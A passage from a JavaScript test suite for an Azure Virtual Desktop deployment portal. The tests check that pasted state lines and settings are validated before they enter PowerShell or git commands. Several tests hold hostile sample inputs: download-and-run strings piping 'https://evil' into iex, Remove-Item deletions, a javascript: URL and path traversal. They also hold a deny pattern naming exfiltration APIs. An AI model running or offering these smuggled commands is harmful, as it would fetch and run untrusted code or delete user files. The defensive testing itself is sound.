  assert.deepEqual(P.repriceEstimate(est, { ...sizing, vmSize: 'Standard_E8as_v5' }, 60, 'northcentralus').stale, ['priced for D8as_v5, not E8as_v5']);
  assert.match(P.repriceEstimate(est, sizing, 60, 'eastus2').stale[0], /priced in northcentralus, not eastus2/);
  assert.equal(P.repriceEstimate(null, sizing, 60, 'x'), null);
});

test('state: a preflight priced with the power settings off -> the portal keeps them for the next commands', () => {
  const r = analyze('state-predeploy-power-off.txt');
  assert.deepEqual(r.power, { autoShutdownTime: 'none', startVmOnConnect: false });
  assert.equal(r.step, 'deploy');
  assert.match(last(r.actions[0].command), / --auto-shutdown none --start-vm-on-connect false$/);
  assert.equal(r.estimate.lines.find((l) => l.key === 'compute').quantity, 728);
});

test('page and engine: parameters/test.bicepparam is offered, and powers like dev', () => {
  const html = readFileSync(new URL('../../../site/portal/index.html', import.meta.url), 'utf8');
  assert.match(html, /<option value="parameters\/test\.bicepparam">/);
  readFileSync(new URL('../../../parameters/test.bicepparam', import.meta.url), 'utf8');
  assert.equal(P.effectivePower({ parameterFile: 'parameters/test.bicepparam' }).autoShutdownTime, '20:00');
  assert.match(P.commands.postdeploy({ ...P.DEFAULTS, environment: 'test' }, true), /-Environment test -Fix/);
});

test('real: deployment failed on the data collection rule (workspace tables not ready) -> known cause, deploy again with the same sizing', () => {
  const r = analyze('real-deploy-dcr-tables.txt');
  assert.equal(r.status, 'failed');
  assert.equal(r.step, 'deploy');
  assert.equal(r.actions.length, 1);
  assert.match(r.actions[0].title, /^InvalidOutputTable: /);
  assert.match(last(r.actions[0].command), /deploy\.sh -p parameters\/dev\.bicepparam -l northcentralus .* --hosts 1 --vm-size Standard_E4as_v5 --max-sessions 16 --profile-quota 100$/);
  assertSelfContained(r);
});

// ---------------------------------------------------------------- verify access: reachability probe (decision 0014)
test('reachability: every host reached -> reachable, with the latency step\'s ratings', () => {
  const r = P.classifyReachability([{ host: 'login.microsoftonline.com', median: 42 }, { host: 'windows.cloud.microsoft', median: 160 }]);
  assert.equal(r.status, 'reachable');
  assert.deepEqual(r.hosts.map((h) => [h.host, h.reached, h.rating.label]), [['login.microsoftonline.com', true, 'Good'], ['windows.cloud.microsoft', true, 'Sluggish']]);
  assert.match(r.guidance, /doesn't show you can sign in/);
});

test('reachability: one host failed -> partial, names it, still a warning to try the desktop', () => {
  const r = P.classifyReachability([{ host: 'login.microsoftonline.com', median: 30 }, { host: 'windows.cloud.microsoft', median: null }]);
  assert.equal(r.status, 'partial');
  assert.match(r.headline, /windows\.cloud\.microsoft/);
  assert.doesNotMatch(r.headline, /login\.microsoftonline\.com/);
  assert.match(r.guidance, /warning, not a stop/);
});

test('reachability: fails closed: nothing reached -> blocked; untested or malformed is never reached', () => {
  const blocked = P.classifyReachability([{ host: 'login.microsoftonline.com', median: null }, { host: 'windows.cloud.microsoft', median: null }]);
  assert.equal(blocked.status, 'blocked');
  assert.match(blocked.guidance, /warning, not a stop/);
  // A host missing from the results was not tested, so the rest can't be "reachable".
  const missing = P.classifyReachability([{ host: 'login.microsoftonline.com', median: 20 }]);
  assert.equal(missing.status, 'partial');
  assert.equal(missing.hosts[1].reached, null);
  assert.equal(P.classifyReachability([{ host: 'login.microsoftonline.com', median: NaN }, { host: 'windows.cloud.microsoft', median: '12' }]).status, 'blocked');
  // Results for other hosts are ignored.
  assert.equal(P.classifyReachability([{ host: 'example.com', median: 5 }]).status, 'unknown');
  for (const x of [[], null, undefined, 'x']) assert.equal(P.classifyReachability(x).status, 'unknown');
});

test('reachability: says what it does not prove', () => {
  const { limits } = P.classifyReachability([]);
  for (const s of [/sign-in/, /\*\.wvd\.microsoft\.com/, /UDP/, /block page/, /front door/]) assert.match(limits, s);
});

test('reachability: probes only concrete hosts from the AVD end-user list', () => {
  assert.deepEqual(P.REACHABILITY_HOSTS.map((h) => h.host), ['login.microsoftonline.com', 'windows.cloud.microsoft']);
  for (const h of P.REACHABILITY_HOSTS) assert.doesNotMatch(h.host, /\*/);
});

test('rating: the latency step\'s thresholds (under 100 good, to 150 usable, above sluggish)', () => {
  assert.deepEqual([99, 100, 150, 151, null].map((ms) => P.rateLatency(ms).label), ['Good', 'Usable', 'Usable', 'Sluggish', 'No answer']);
});

test('page: Verify access comes after Sign in, holds the probe, and the page fetches only through the timed probe', () => {
  const html = readFileSync(new URL('../../../site/portal/index.html', import.meta.url), 'utf8');
  assert.deepEqual(P.STEPS.slice(-2).map((s) => s.id), ['signin', 'verify']);
  const verify = html.slice(html.indexOf('data-step="verify"'), html.indexOf('</section>', html.indexOf('data-step="verify"')));
  assert.match(verify, /id="reach-run"/);
  assert.match(verify, /class="slot"/, 'the shared next-step box and paste box can sit in it');
  // Nothing pasted or measured leaves the browser: one fetch, no-cors, no credentials, no referrer, no body.
  const page = readFileSync(new URL('../../../site/portal/portal-page.js', import.meta.url), 'utf8');
  const fetches = [...page.matchAll(/\bfetch\(([^)]*)\)/g)];
  assert.equal(fetches.length, 1);
  assert.match(fetches[0][1], /mode: 'no-cors'.*credentials: 'omit'.*referrerPolicy: 'no-referrer'/);
  assert.doesNotMatch(page, /XMLHttpRequest|sendBeacon|new WebSocket|new EventSource/);
  // The page itself runs no inline script and declares a CSP that allows none, nor any third-party source (red team PH-9).
  assert.doesNotMatch(html, /<script(?![^>]*\bsrc=")/, 'inline script in index.html');
  assert.doesNotMatch(html, /\son[a-z]+="/i, 'inline event handler in index.html');
  const csp = /<meta http-equiv="Content-Security-Policy" content="([^"]+)"/.exec(html);
  assert.ok(csp, 'CSP meta tag');
  for (const d of ["default-src 'none'", "script-src 'self'", "connect-src https:", "base-uri 'none'", "form-action 'none'"]) assert.ok(csp[1].split('; ').includes(d), d);
  assert.doesNotMatch(csp[1], /unsafe-eval|script-src[^;]*unsafe-inline|https?:\/\//);
  for (const m of html.matchAll(/<(?:script|link)[^>]*(?:src|href)="([^"]+)"/g)) assert.doesNotMatch(m[1], /^(https?:)?\/\//, 'third-party ' + m[1]);
  for (const f of ['portal-core.js', 'report.js']) {
    assert.doesNotMatch(readFileSync(new URL(`../../../site/portal/${f}`, import.meta.url), 'utf8'), /\bfetch\(|XMLHttpRequest|sendBeacon|WebSocket|EventSource/, f);
  }
});

// ---------------------------------------------------------------- verify access: launch link (decision 0014)
const LAUNCH = { workspaceObjectId: 'a0a0a0a0-0000-4000-8000-000000000001', desktopObjectId: 'b0b0b0b0-0000-4000-8000-000000000001', tenantId: '55555555-5555-5555-5555-555555555555', workspace: 'vdws-avdlz-dev' };

test('launch: direct web client link from the two object IDs; tenant only when asked, login hint last', () => {
  const base = 'https://windows.cloud.microsoft/webclient/avd/a0a0a0a0-0000-4000-8000-000000000001/b0b0b0b0-0000-4000-8000-000000000001';
  assert.equal(P.launchUrl(LAUNCH), base);
  assert.equal(P.launchUrl(LAUNCH, { tenant: true }), base + '?tenant=55555555-5555-5555-5555-555555555555');
  assert.equal(P.launchUrl(LAUNCH, { tenant: true, loginHint: 'alex@contoso.com' }), base + '?tenant=55555555-5555-5555-5555-555555555555#loginHint=alex@contoso.com');
  assert.equal(P.launchUrl({ ...LAUNCH, tenantId: undefined }, { tenant: true }), base, 'no tenant ID, no tenant parameter');
  assert.equal(P.launchUrl(LAUNCH, { loginHint: 'alex@contoso.com' }), base + '#loginHint=alex@contoso.com', 'internal identity: hint without the tenant parameter');
});

test('launch: matches the fully formatted example on Microsoft\'s direct launch URLs page (spec §11 A2)', () => {
  // https://learn.microsoft.com/windows-app/direct-launch-urls, Azure Virtual Desktop tab (ms.date 2026-09-09).
  const documented = 'https://windows.cloud.microsoft/webclient/avd/00000000-0000-0000-0000-000000000000/11111111-1111-1111-1111-111111111111?tenant=22222222-2222-2222-2222-222222222222#loginHint=user@contoso.com';
  const launch = { workspaceObjectId: '00000000-0000-0000-0000-000000000000', desktopObjectId: '11111111-1111-1111-1111-111111111111', tenantId: '22222222-2222-2222-2222-222222222222' };
  assert.equal(P.launchUrl(launch, { tenant: true, loginHint: 'user@contoso.com' }), documented);
});

test('launch: a pasted state line is untrusted: only GUIDs, only windows.cloud.microsoft, no injected URL parts', () => {
  for (const bad of [null, undefined, 'x', {}, { ...LAUNCH, workspaceObjectId: '../../evil' }, { ...LAUNCH, desktopObjectId: 'b0b0b0b0-0000-4000-8000-000000000001/../x' },
    { ...LAUNCH, workspaceObjectId: 'javascript:alert(1)' }, { ...LAUNCH, desktopObjectId: '' }]) {
    assert.equal(P.launchUrl(bad), null, JSON.stringify(bad));
  }
  for (const hint of ['x@evil.com#/../', 'a b@c.d', 'x@y.z?tenant=1', 'x@y.z&a=b', 'no-at-sign', "x'@y.z", 'x@y']) {
    assert.doesNotMatch(P.launchUrl(LAUNCH, { loginHint: hint }), /loginHint/, hint);
  }
  assert.equal(P.launchUrl({ ...LAUNCH, tenantId: 'evil.com' }, { tenant: true }).includes('tenant='), false);
  assert.equal(P.launchTarget({ ...LAUNCH, workspace: '<img src=x>' }).workspace, undefined, 'names are plain resource names or dropped');
});

test('state: post-deployment ready with launch IDs -> kept in the config the page saves; Verify access points at the link', () => {
  const r = analyze('state-postdeploy-ready-launch.txt');
  assert.equal(r.step, 'signin');
  assert.deepEqual(P.launchTarget(r.config.launch), { workspaceObjectId: LAUNCH.workspaceObjectId, desktopObjectId: LAUNCH.desktopObjectId, tenantId: LAUNCH.tenantId, workspace: 'vdws-avdlz-dev', appGroup: 'vdag-avdlz-dev-desktop' });
  assert.match(P.actionsForStep('verify', r.config)[0].why, /the link above/);
  // Older output without launch IDs: the plain web client.
  const old = analyze('state-postdeploy-ready.txt');
  assert.equal(P.launchTarget(old.config.launch), null);
  assert.match(P.actionsForStep('verify', old.config)[0].why, /https:\/\/windows\.cloud\.microsoft/);
});

test('page: the launch link opens in a new tab without a referrer and defaults to the web client', () => {
  const html = readFileSync(new URL('../../../site/portal/index.html', import.meta.url), 'utf8');
  assert.match(html, /<a id="launch-link"[^>]*href="https:\/\/windows\.cloud\.microsoft"[^>]*target="_blank" rel="noopener noreferrer"/);
  assert.match(readFileSync(new URL('../../../site/portal/portal-page.js', import.meta.url), 'utf8'), /P\.launchUrl\(/);
});

// ---------------------------------------------------------------- verify access: telemetry (decision 0014)
test('state: access verified -> the connection, its setup time with what it means, and other failed attempts', () => {
  const r = analyze('state-verify-verified.txt');
  assert.equal(r.stage, 'verify');
  assert.equal(r.status, 'verified');
  assert.equal(r.step, 'verify');
  assert.match(r.headline, /^Access check: Verified/);
  assert.match(r.actions[0].why, /reached Connected .*avdlzdsh-001.*HTML client on Windows 11/);
  assert.match(r.actions[0].why, /12\.4 s \(Started to Connected\)\. That is connection setup, not the time to a usable desktop/);
  assert.match(r.actions[0].why, /doesn't prove the desktop is usable/);
  assert.equal(r.actions[1].title, 'Another attempt failed');
});

test('state: connection failed -> the logged error, the post-deployment check, then check again', () => {
  const r = analyze('state-verify-failed.txt');
  assert.equal(r.status, 'failed');
  assert.match(r.actions[0].why, /ExampleCodeForTests: Example failure message/);
  assert.match(last(r.actions[0].command), /Test-AvdLandingZoneReadiness\.ps1 -NamePrefix avdlz -Environment dev$/);
  assert.match(last(r.actions[1].command), /Test-AvdUserConnection\.ps1 -NamePrefix avdlz -Environment dev -UserPrincipalName 'admin@contoso\.com'$/);
  assertSelfContained(r);
});

test('state: not verified is never a pass: no rows and in progress -> wait longer; a refused query -> the role', () => {
  for (const [name, title] of [['none', /^No connection found yet/], ['inprogress', /hasn't reached Connected/]]) {
    const r = analyze(`state-verify-${name}.txt`);
    assert.equal(r.status, 'notverified', name);
    assert.match(r.headline, /Not verified/);
    assert.match(r.actions[0].title, title);
    assert.match(r.actions[0].why, /This is not a pass/);
    assert.match(last(r.actions[0].command), /Test-AvdUserConnection\.ps1 .* -TimeoutMinutes 30$/);
    assertSelfContained(r);
  }
  const f = analyze('state-verify-forbidden.txt');
  assert.equal(f.status, 'notverified');
  assert.match(f.actions[0].why, /can't read the Log Analytics workspace's data.*Log Analytics Reader on rg-avdlz-dev-management/);
  assert.match(last(f.actions[1].command), /Test-AvdUserConnection\.ps1/);
});

test('verify: the step offers the telemetry check, and a pasted run of it is recognized', () => {
  const actions = P.actionsForStep('verify', {});
  assert.match(last(actions[1].command), /^\.\/scripts\/ops\/Test-AvdUserConnection\.ps1 -NamePrefix avdlz -Environment dev$/);
  assert.match(last(P.commands.verify(P.DEFAULTS, { demo: true, user: "o'neil@contoso.com", timeout: 30 })), / -UserPrincipalName 'o''neil@contoso\.com' -Demo -TimeoutMinutes 30$/);
  const r = P.analyze('PS /home/admin/avd-landing-zone> ./scripts/ops/Test-AvdUserConnection.ps1 -NamePrefix avdlz -Environment dev\nThe term \'./scripts/ops/Test-AvdUserConnection.ps1\' is not recognized as a name of a cmdlet', {}, { currentStep: 'verify' });
  assert.equal(r.step, 'verify');
});

test('steps that use Microsoft Graph sign in once first, through the operator app when its client ID is set', () => {
  const cfg = { ...P.DEFAULTS, testUserUpn: 'alex@contoso.com' };
  const signInLine = (c) => c.trim().split('\n').at(-2);
  for (const c of [P.commands.predeploy(cfg, true), P.commands.postdeploy(cfg, false), P.commands.postdeploy(cfg, true), P.commands.demo(cfg), P.commands.removeDemo(cfg)]) {
    assert.equal(signInLine(c), './scripts/ops/Connect-AvdLandingZone.ps1');
  }
  // No Graph in these: no sign-in line.
  for (const c of [P.commands.wellArchitected(cfg), P.commands.verify(cfg), P.commands.deploy(cfg)]) assert.doesNotMatch(c, /Connect-AvdLandingZone/);
  const op = { ...cfg, graphClientId: ' 11111111-2222-3333-4444-555555555555 ' };
  assert.equal(signInLine(P.commands.removeDemo(op)), "./scripts/ops/Connect-AvdLandingZone.ps1 -ClientId '11111111-2222-3333-4444-555555555555'");
  // Anything that is not a client ID is left out rather than passed to the script.
  assert.equal(signInLine(P.commands.demo({ ...cfg, graphClientId: "x'; Remove-Item ~ -Recurse" })), './scripts/ops/Connect-AvdLandingZone.ps1');
});

// Where did I leave off (build/specs/run-recorder-spec.md section 4).
test('state: resume while the deployment runs -> check on it, never deploy again', () => {
  const r = analyze('state-resume-running.txt');
  assert.equal(r.stage, 'resume');
  assert.equal(r.step, 'deploy');
  assert.match(r.headline, /^Where you left off/);
  assert.match(r.actions[0].command, /az deployment sub show -n \$name/);
  assert.match(r.actions[0].command, /avdlz-dev-20261020-171200/);
  assert.doesNotMatch(r.actions[0].command, /deploy\.sh/);
  assert.match(r.actions[0].why, /Do not start it again/);
});

test('state: resume after a finished deployment -> post-deployment setup with -Fix', () => {
  const r = analyze('state-resume-postdeploy.txt');
  assert.equal(r.step, 'postdeploy');
  assert.equal(last(r.actions[0].command), './scripts/ops/Test-AvdLandingZoneReadiness.ps1 -NamePrefix avdlz -Environment dev -Fix -AllowHostStart');
  assert.match(r.actions[0].why, /no post-deployment run is recorded/);
  assertSelfContained(r);
});

test('state: resume it cannot classify -> no command, ask for a report', () => {
  const r = analyze('state-resume-unknown.txt');
  assert.equal(r.status, 'unknown');
  assert.equal(r.step, null);
  assert.equal(r.actions[0].command, '');
  assert.match(r.actions[0].why, /Report a problem/);
});

test('commands: where did I leave off is a self-contained block', () => {
  const c = P.commands.runStatus({ ...P.DEFAULTS, namePrefix: 'avdlz', environment: 'dev' });
  assert.match(c, /Set-Location ~\/avd-landing-zone/);
  assert.equal(last(c), './scripts/ops/Get-AvdRunStatus.ps1 -NamePrefix avdlz -Environment dev');
});

// Same-tenant recovery (build/specs/recovery-spec.md): the status check and the recovery test.
test('state: recovery not met -> snapshot with identity, then plan a test; nothing runs on its own', () => {
  const r = analyze('state-recovery-notmet.txt');
  assert.equal(r.stage, 'recovery');
  assert.equal(r.status, 'notmet');
  assert.match(r.headline, /^Recovery: Not met/);
  const titles = r.actions.map((a) => a.title);
  assert.deepEqual(titles, ['Take a configuration snapshot', 'Plan a recovery test', 'Deploy from a pushed commit']);
  assert.equal(last(r.actions[0].command), './scripts/ops/Export-AvdConfiguration.ps1 -NamePrefix avdlz -Environment dev -IncludeIdentity');
  assert.match(r.actions[0].command, /Connect-AvdLandingZone\.ps1/);
  assert.equal(last(r.actions[1].command), './scripts/ops/Start-AvdRecoveryTest.ps1 -NamePrefix avdlz -Environment dev');
  assert.doesNotMatch(r.actions[1].command, /-Go/);
  assert.equal(r.actions[2].command, '');
  assertSelfContained(r);
});

test('state: recovery met -> no command', () => {
  const r = analyze('state-recovery-met.txt');
  assert.equal(r.status, 'met');
  assert.equal(r.actions.length, 1);
  assert.match(r.actions[0].title, /R0 is met/);
  assert.equal(r.actions[0].command, '');
});

test('state: recovery test planned -> the same command with -Go, only when the operator runs it', () => {
  const r = analyze('state-recovery-test-plan.txt');
  assert.equal(r.status, 'ready');
  assert.equal(last(r.actions[0].command), './scripts/ops/Start-AvdRecoveryTest.ps1 -NamePrefix avdlz -Environment dev -Go');
  assert.match(r.actions[0].why, /Nothing was created/);
});

test('state: recovery test passed -> remove the test copy by its run ID', () => {
  const r = analyze('state-recovery-test-passed.txt');
  assert.equal(r.status, 'passed');
  assert.match(last(r.actions[0].command), /^\.\/scripts\/ops\/Start-AvdRecoveryTest\.ps1 -NamePrefix avdlz -Environment dev -Cleanup -RunId 'run-\d{8}-\d{4}-[a-z0-9]{4}'$/);
});

test('commands: recovery status passes the tier and region only when they are valid', () => {
  const cfg = { ...P.DEFAULTS, namePrefix: 'avdlz', environment: 'prod' };
  assert.equal(last(P.commands.recoveryStatus(cfg)), './scripts/ops/Get-AvdRecoveryStatus.ps1 -NamePrefix avdlz -Environment prod');
  assert.equal(last(P.commands.recoveryStatus(cfg, { tier: 'R1', recoveryLocation: 'southcentralus' })), './scripts/ops/Get-AvdRecoveryStatus.ps1 -NamePrefix avdlz -Environment prod -RecoveryTier R1 -RecoveryLocation southcentralus');
  assert.equal(last(P.commands.recoveryStatus(cfg, { tier: 'R9; rm', recoveryLocation: 'x y' })), './scripts/ops/Get-AvdRecoveryStatus.ps1 -NamePrefix avdlz -Environment prod');
});

// Blue/green host rotation (build/specs/image-pipeline-spec.md section 6.5): every run continues where the last
// stopped; a rollback is offered until the old hosts are removed.
test('state: rotation refused -> what to fix, nothing changed, no command', () => {
  const r = analyze('state-rotation-refused.txt');
  assert.equal(r.stage, 'rotation');
  assert.equal(r.status, 'refused');
  assert.match(r.headline, /^Host rotation: Refused/);
  assert.match(r.actions[0].why, /already runs .* Nothing was changed/);
  assert.equal(r.actions[0].command, '');
});

test('state: rotation -> its actions show on a slide that has a command slot', () => {
  for (const f of ['state-rotation-refused.txt', 'state-rotation-waiting.txt', 'state-rotation-done.txt']) {
    const r = analyze(f);
    assert.equal(r.step, 'postdeploy', f);
    assert.ok(P.STEPS.some((s) => s.id === r.step), f);
  }
});

test('state: rotation with its own parameter file -> every command keeps it', () => {
  const text = fixture('state-rotation-waiting.txt').replace('"environment":"dev",', '"environment":"dev","parameterFile":"parameters/dev-eu.bicepparam",');
  const r = P.analyze(text, {}, {});
  assert.equal(last(r.actions[0].command), "./scripts/ops/Invoke-AvdHostRotation.ps1 -NamePrefix avdlz -Environment dev -ParameterFile 'parameters/dev-eu.bicepparam'");
  assert.match(last(r.actions[1].command), /-ParameterFile 'parameters\/dev-eu\.bicepparam' -Rollback$/);
});

test('state: rotation waiting for sessions -> run it again, or roll back', () => {
  const r = analyze('state-rotation-waiting.txt');
  assert.equal(r.status, 'waiting');
  assert.equal(last(r.actions[0].command), './scripts/ops/Invoke-AvdHostRotation.ps1 -NamePrefix avdlz -Environment dev');
  assert.equal(last(r.actions[1].command), './scripts/ops/Invoke-AvdHostRotation.ps1 -NamePrefix avdlz -Environment dev -Rollback');
  assertSelfContained(r);
});

test('state: rotation paused with -StopBefore -> continue without it, or roll back', () => {
  const text = fixture('state-rotation-waiting.txt').replace('"phase":"Wait","sessionsLeft":2', '"phase":"Wait","stopBefore":"Remove"')
    .replace(/"warnings":\[.*\]\}/, '"warnings":[{"id":"rotation-paused","area":"Rotation","check":"Paused before Remove","detail":"No sessions left on the old hosts.","remediation":"Run this again without -StopBefore to continue from phase Wait, or with -Rollback to undo the rotation."}]}');
  const r = P.analyze(text, {}, {});
  assert.equal(r.status, 'waiting');
  assert.match(r.actions[0].title, /paused before Remove/);
  assert.match(r.actions[0].why, /No sessions left .* continue from phase Wait/);
  assert.equal(last(r.actions[0].command), './scripts/ops/Invoke-AvdHostRotation.ps1 -NamePrefix avdlz -Environment dev');
  assert.equal(last(r.actions[1].command), './scripts/ops/Invoke-AvdHostRotation.ps1 -NamePrefix avdlz -Environment dev -Rollback');
  assertSelfContained(r);
});

test('state: rollback or rotation paused before Drain -> continue; a paused rollback offers no rollback', () => {
  const paused = '"warnings":[{"id":"rotation-paused","area":"Rotation","check":"Paused before Drain","detail":"2 new host(s) ready.","remediation":"Run this again to continue from phase Deploy, or with -Rollback to undo the rotation."}]}';
  const base = fixture('state-rotation-waiting.txt').replace(/"warnings":\[.*\]\}/, paused);
  let r = P.analyze(base.replace('"phase":"Wait","sessionsLeft":2', '"phase":"Deploy","stopBefore":"Drain"'), {}, {});
  assert.match(r.actions[0].title, /paused before Drain/);
  assert.match(r.actions[0].why, /continue from phase Deploy/);
  assert.equal(r.actions.length, 2);
  r = P.analyze(base.replace('"rollback":false', '"rollback":true').replace('"phase":"Wait","sessionsLeft":2', '"phase":"Wait","stopBefore":"Remove"'), {}, {});
  assert.equal(r.actions.length, 1);
  assert.equal(last(r.actions[0].command), './scripts/ops/Invoke-AvdHostRotation.ps1 -NamePrefix avdlz -Environment dev');
});

test('state: rotation stopped by an Azure error -> what Azure said, run it again, or roll back', () => {
  const text = fixture('state-rotation-waiting.txt').replace('"status":"waiting"', '"status":"failed"')
    .replace('"failures":[]', '"failures":[{"id":"rotation-error","area":"Rotation","check":"Phase Wait","detail":"ARM PATCH failed: 429 TooManyRequests","remediation":"Fix what Azure reported and run this again; it continues from the same phase."}]');
  const r = P.analyze(text, {}, {});
  assert.equal(r.status, 'failed');
  assert.match(r.actions[0].title, /stopped in phase Wait/);
  assert.match(r.actions[0].why, /429 TooManyRequests .* continues from the same phase/);
  assert.equal(last(r.actions[0].command), './scripts/ops/Invoke-AvdHostRotation.ps1 -NamePrefix avdlz -Environment dev');
  assert.match(last(r.actions[1].command), / -Rollback$/);
});

test('state: rollback waiting for the deployment -> the next command is the rollback again', () => {
  const text = fixture('state-rotation-waiting.txt').replace('"phase":"Wait"', '"phase":"Deploy","rollbackPending":true');
  const r = P.analyze(text, {}, {});
  assert.equal(r.actions.length, 1);
  assert.match(r.actions[0].title, /Roll back once the deployment ends/);
  assert.equal(last(r.actions[0].command), './scripts/ops/Invoke-AvdHostRotation.ps1 -NamePrefix avdlz -Environment dev -Rollback');
});

test('state: rotation past the deadline -> sign-out only when asked, with -LogOffAtDeadline', () => {
  const r = analyze('state-rotation-after-deadline.txt');
  assert.equal(last(r.actions[0].command), './scripts/ops/Invoke-AvdHostRotation.ps1 -NamePrefix avdlz -Environment dev -LogOffAtDeadline');
});

test('state: rotation done -> delete the old devices by hand; roll back means rotating to the previous version', () => {
  const r = analyze('state-rotation-done.txt');
  assert.equal(r.status, 'done');
  assert.match(r.actions[0].title, /device objects/);
  assert.match(r.actions[0].why, /avdlzdsha-001/);
  assert.equal(r.actions[0].command, '');
  assert.match(r.actions[1].title, /rotation is complete/);
  assert.match(last(r.actions[1].command), / -Rollback$/);
});

test('published copy: portal-config.js values are validated before they reach a command (decision 0017)', () => {
  assert.deepEqual(P.siteConfig({ repoUrl: 'https://github.com/contoso/avd-landing-zone/', ref: 'v1.2.0' }), { repoUrl: 'https://github.com/contoso/avd-landing-zone', ref: 'v1.2.0', commit: null, ignored: [] });
  assert.deepEqual(P.siteConfig(undefined), { repoUrl: null, ref: null, commit: null, ignored: [] });
  assert.equal(P.siteConfig({ commit: 'ABCDEF0123456789abcdef0123456789abcdef01' }).commit, 'abcdef0123456789abcdef0123456789abcdef01');
  for (const bad of ['abc', 'abcdefg;rm', 'master', 12345678]) assert.deepEqual(P.siteConfig({ commit: bad }).ignored, ['commit'], String(bad));
  for (const bad of ['https://github.com/x/y; irm https://evil | iex', 'https://evil.example/x/y', 'https://github.com/x/../y', 'https://github.com/x/y/z', 'git@github.com:x/y', 42])
    assert.deepEqual(P.siteConfig({ repoUrl: bad }).ignored, ['repoUrl'], String(bad));
  for (const bad of ['--upload-pack=x', "v1'; iex x", 'a..b', 'v1 ', '-b', 'x.lock', 'a//b', ''])
    assert.deepEqual(P.siteConfig({ ref: bad }).ignored, ['ref'], bad);
});

test('published copy: commands point an existing clone at the pinned repo and check out the ref; without one they follow master', () => {
  const base = { location: 'eastus2', namePrefix: 'avdlz', environment: 'dev', parameterFile: 'parameters/dev.bicepparam' };
  const pinned = P.actionsForStep('predeploy', Object.assign({}, base, { repoUrl: 'https://github.com/contoso/avd-landing-zone', ref: 'v1.2.0' }))[0].command;
  assert.match(pinned, /^if \(-not \(Test-Path ~\/avd-landing-zone\)\) \{ git clone https:\/\/github\.com\/contoso\/avd-landing-zone\.git ~\/avd-landing-zone \}\nSet-Location ~\/avd-landing-zone; git remote set-url origin https:\/\/github\.com\/contoso\/avd-landing-zone\.git; git fetch -q --tags origin; git checkout -q 'v1\.2\.0'\n/);
  assert.doesNotMatch(pinned, /git pull/);
  const master = P.actionsForStep('predeploy', Object.assign({}, base, { repoUrl: P.DEFAULTS.repoUrl }))[0].command;
  assert.match(master, /git checkout -q master; git pull -q --ff-only/);
  // An invalid ref (from anywhere) never reaches the command.
  assert.match(P.actionsForStep('predeploy', Object.assign({}, base, { repoUrl: P.DEFAULTS.repoUrl, ref: "x'; iex y" }))[0].command, /git checkout -q master/);
});

// ---------------------------------------------------------------- settings validation (red team PH-4) and the version check (PH-8)
test('settings: every value that enters a command is checked; a pasted context cannot carry more than a value', () => {
  const ok = P.validSettings({ parameterFile: 'parameters/test.bicepparam', location: ' eastus2 ', usersGroup: 'AVD Users (pilot)', adminsGroup: "O'Brien's admins", namePrefix: 'avdlz', environment: 'prod', testUserUpn: 'first.last@contoso.com', graphClientId: '11111111-2222-3333-4444-555555555555', sizing: { hosts: 2 } });
  assert.deepEqual(ok.rejected, []);
  assert.equal(ok.settings.location, 'eastus2');
  assert.deepEqual(ok.settings.sizing, { hosts: 2 }, 'other keys pass through');
  const bad = P.validSettings({ parameterFile: '../x.bicepparam; iex', location: 'eastus2; Remove-Item ~', usersGroup: 'a\nb', namePrefix: 'avdlz-prod', environment: 'staging', testUserUpn: "x'; iex@evil", graphClientId: 'not-a-guid' });
  assert.deepEqual(bad.rejected.sort(), ['environment', 'graphClientId', 'location', 'namePrefix', 'parameterFile', 'testUserUpn', 'usersGroup']);
  assert.deepEqual(bad.settings, {});
  assert.deepEqual(P.validSettings({ location: '', namePrefix: null }), { settings: {}, rejected: [] }, 'empty is neither');
  assert.deepEqual(Object.keys(P.SETTINGS).sort(), [...P.SETTING_NAMES].sort());
  for (const k of P.SETTING_NAMES) assert.ok(P.SETTINGS[k].test(String(P.DEFAULTS[k])) || P.DEFAULTS[k] === '', k + ' default fits');
  // A crafted state line: the bad values are dropped and named, the good ones and the rest of the context are kept.
  const text = '<<<AVDLZ-STATE ' + JSON.stringify({ v: 1, stage: 'predeploy', status: 'ready', context: { parameterFile: 'parameters/dev.bicepparam', location: 'eastus2', namePrefix: 'x; irm https://evil | iex', environment: 'dev', sizing: { hosts: 1, vmSize: 'Standard_E4as_v5', maxSessions: 16, profileQuotaGiB: 100 } }, counts: { pass: 1 }, failures: [], warnings: [] }) + ' AVDLZ-STATE>>>';
  const r = P.analyze(text, { namePrefix: 'avdlz' });
  assert.deepEqual(r.rejectedSettings, ['namePrefix']);
  assert.equal(r.config.namePrefix, 'avdlz');
  assert.equal(r.config.location, 'eastus2');
  assert.equal(r.sizing.hosts, 1);
  for (const a of r.actions) assert.doesNotMatch(a.command, /irm|iex/);
});

test('version: the state line carries the scripts\' commit and the portal says when it differs from its own', () => {
  const state = (commit) => '<<<AVDLZ-STATE ' + JSON.stringify({ v: 1, stage: 'predeploy', status: 'ready', context: { location: 'eastus2', commit }, counts: {}, failures: [], warnings: [] }) + ' AVDLZ-STATE>>>';
  const same = P.analyze(state('abc1234'), {}, { portalCommit: 'abc1234def0123456789abcdef0123456789abcd' });
  assert.equal(same.versionNote, '');
  assert.deepEqual(same.commit, { state: 'abc1234', portal: 'abc1234def0123456789abcdef0123456789abcd' });
  assert.equal(same.config.commit, undefined, 'the commit is not a setting');
  const diff = P.analyze(state('abc1234'), {}, { portalCommit: '0123456' });
  assert.match(diff.versionNote, /commit abc1234.*built from 0123456/);
  assert.equal(diff.status, 'ready', 'a version note never changes the verdict');
  assert.equal(P.analyze(state('abc1234'), {}, {}).versionNote, '', 'an unversioned portal (a copy without a commit) says nothing');
  assert.equal(P.analyze(state(undefined), {}, { portalCommit: '0123456' }).versionNote, '', 'old scripts without a commit say nothing');
  assert.equal(P.analyze(state('x; iex'), {}, { portalCommit: '0123456' }).commit.state, null, 'a commit that is not a hash is ignored');
  assert.equal(P.versionNote('abc1234', 'ABC1234'), '');
});

// Recording a run (run recorder, phase 2): the run ID rides in every command once recording is on.
const REC = { ...P.DEFAULTS, record: { runId: 'run-20261021-0517-ab12', mode: 'azure' } };

test('record: newRunId is UTC and matches the recorder format', () => {
  assert.equal(P.newRunId(new Date(Date.UTC(2026, 9, 21, 5, 7)), 'AB-12'), 'run-20261021-0507-ab12');
  assert.match(P.newRunId(), /^run-\d{8}-\d{4}-[a-z0-9]{4}$/);
});

test('record: recording accepts only a valid run ID and defaults the mode to azure', () => {
  assert.equal(P.recording({}), null);
  assert.equal(P.recording({ record: { runId: 'run-1; Remove-Item' } }), null);
